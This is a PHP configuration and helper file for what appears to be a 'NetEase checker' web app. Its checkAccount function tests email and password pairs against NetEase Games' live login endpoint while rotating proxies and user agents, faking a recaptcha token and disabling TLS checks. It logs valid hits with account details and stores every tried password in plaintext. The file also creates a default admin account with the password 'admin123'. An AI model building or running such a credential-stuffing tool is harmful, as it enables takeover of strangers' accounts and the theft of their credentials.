<?php
// config.php - Database Configuration for Railway
session_start();

$db_host = getenv('MYSQL_HOST') ?: getenv('DB_HOST') ?: 'localhost';
$db_name = getenv('MYSQL_DATABASE') ?: getenv('DB_NAME') ?: 'netease_checker';
$db_user = getenv('MYSQL_USER') ?: getenv('DB_USER') ?: 'root';
$db_pass = getenv('MYSQL_PASSWORD') ?: getenv('DB_PASS') ?: '';

if (getenv('DATABASE_URL')) {
    $db_url = parse_url(getenv('DATABASE_URL'));
    $db_host = $db_url['host'];
    $db_user = $db_url['user'];
    $db_pass = $db_url['pass'];
    $db_name = ltrim($db_url['path'], '/');
}

if (getenv('MYSQL_URL')) {
    $db_url = parse_url(getenv('MYSQL_URL'));
    $db_host = $db_url['host'];
    $db_user = $db_url['user'];
    $db_pass = $db_url['pass'];
    $db_name = ltrim($db_url['path'], '/');
}

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
} catch(PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

$pdo->exec("CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(80) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    email VARCHAR(120) UNIQUE NOT NULL,
    is_admin BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL
)");

$pdo->exec("CREATE TABLE IF NOT EXISTS api_keys (
    id INT AUTO_INCREMENT PRIMARY KEY,
    api_key VARCHAR(64) UNIQUE NOT NULL,
    user_id INT NOT NULL,
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NULL,
    last_used TIMESTAMP NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
)");

$pdo->exec("CREATE TABLE IF NOT EXISTS check_results (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    email VARCHAR(120) NOT NULL,
    password VARCHAR(120) NOT NULL,
    status VARCHAR(50) NOT NULL,
    details TEXT,
    proxy_used VARCHAR(50),
    checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
)");

$pdo->exec("CREATE TABLE IF NOT EXISTS proxies (
    id INT AUTO_INCREMENT PRIMARY KEY,
    proxy_string VARCHAR(100) UNIQUE NOT NULL,
    is_active BOOLEAN DEFAULT TRUE,
    last_used TIMESTAMP NULL,
    failure_count INT DEFAULT 0,
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$stmt = $pdo->prepare("SELECT id FROM users WHERE is_admin = 1 LIMIT 1");
$stmt->execute();
if (!$stmt->fetch()) {
    $hashed = password_hash('admin123', PASSWORD_DEFAULT);
    $stmt = $pdo->prepare("INSERT INTO users (username, email, password_hash, is_admin) VALUES (?, ?, ?, 1)");
    $stmt->execute(['admin', 'admin@example.com', $hashed]);
}

function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

function redirect($url) {
    header("Location: $url");
    exit();
}

function flash($message, $type = 'info') {
    $_SESSION['flash'] = ['message' => $message, 'type' => $type];
}

function getFlash() {
    if (isset($_SESSION['flash'])) {
        $flash = $_SESSION['flash'];
        unset($_SESSION['flash']);
        return $flash;
    }
    return null;
}

function generateApiKey() {
    return bin2hex(random_bytes(32));
}

function getRandomProxy($pdo) {
    $stmt = $pdo->prepare("SELECT proxy_string FROM proxies WHERE is_active = 1 ORDER BY RAND() LIMIT 1");
    $stmt->execute();
    $proxy = $stmt->fetch();
    if ($proxy) {
        return $proxy['proxy_string'];
    }
    return null;
}

function getRandomUserAgent() {
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
    ];
    return $agents[array_rand($agents)];
}

function checkAccount($email, $password, $user_id, $pdo) {
    try {
        $proxy = getRandomProxy($pdo);
        $md5_pwd = md5($password);
        $ua = getRandomUserAgent();
        
        $login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US";
        $login_data = http_build_query([
            "account" => $email,
            "hash_password" => $md5_pwd,
            "client_id" => "official",
            "response_type" => "cookie",
            "redirect_uri" => "https://account.neteasegames.com/account/home?lang=en_US",
            "state" => "official_state"
        ]);
        
        $headers = [
            "Pragma: no-cache",
            "Accept: */*",
            "User-Agent: $ua",
            "recaptcha-token: test",
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $login_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $login_data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        if ($proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
        }
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        $data = json_decode($response, true);
        
        $status = 'unknown';
        $details = '';
        
        if (isset($data['code']) && $data['code'] == 1006) {
            $status = 'invalid';
            $details = 'Invalid password';
        } elseif (strpos($response, 'Account does not exist') !== false) {
            $status = 'failed';
            $details = 'Account does not exist';
        } elseif (isset($data['code']) && $data['code'] == 0) {
            $ch2 = curl_init();
            curl_setopt($ch2, CURLOPT_URL, "https://account.neteasegames.com/ucenter/user/info?lang=en_US");
            curl_setopt($ch2, CURLOPT_HTTPHEADER, ["User-Agent: $ua"]);
            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch2, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
            
            if ($proxy) {
                curl_setopt($ch2, CURLOPT_PROXY, $proxy);
            }
            
            $info_response = curl_exec($ch2);
            curl_close($ch2);
            
            $info = json_decode($info_response, true);
            
            if (isset($info['user'])) {
                $user_id_str = $info['user']['user_id'] ?? 'N/A';
                $name = $info['user']['account_name'] ?? 'N/A';
                $location = $info['user']['location'] ?? 'N/A';
                $status = 'success';
                $details = "ID:$user_id_str | Name:$name | Location:$location";
            } else {
                $status = 'success';
                $details = 'Login successful';
            }
        } else {
            $status = 'failed';
            $details = 'Unknown error';
        }
        
        $stmt = $pdo->prepare("INSERT INTO check_results (user_id, email, password, status, details, proxy_used) VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->execute([$user_id, $email, $password, $status, $details, $proxy]);
        
        return ['email' => $email, 'password' => $password, 'status' => $status, 'details' => $details];
        
    } catch (Exception $e) {
        $stmt = $pdo->prepare("INSERT INTO check_results (user_id, email, password, status, details) VALUES (?, ?, ?, 'error', ?)");
        $stmt->execute([$user_id, $email, $password, $e->getMessage()]);
        
        return ['email' => $email, 'password' => $password, 'status' => 'error', 'details' => $e->getMessage()];
    }
}
?>